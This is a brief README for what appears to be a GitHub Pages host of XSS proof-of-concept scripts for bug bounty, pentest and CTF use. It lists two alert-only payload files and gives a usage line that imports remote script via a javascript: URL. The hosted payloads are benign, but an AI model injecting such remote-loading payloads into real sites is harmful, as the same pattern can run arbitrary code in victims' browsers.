# S1N6H.github.io

Public JS payload host (GitHub Pages) for **authorized** XSS proof-of-concept work — bug bounty, pentests, CTFs.

| File | Effect |
|------|--------|
| `x.js` | `alert(origin)` — drop-in mirror of the classic `alert(origin)` payload |
| `alert.js` | `alert(document.domain)` |

Usage example:

```js
javascript:import('//s1n6h.github.io/x.js')
```

Only benign `alert()` proofs are hosted here. No session theft, no data exfiltration.
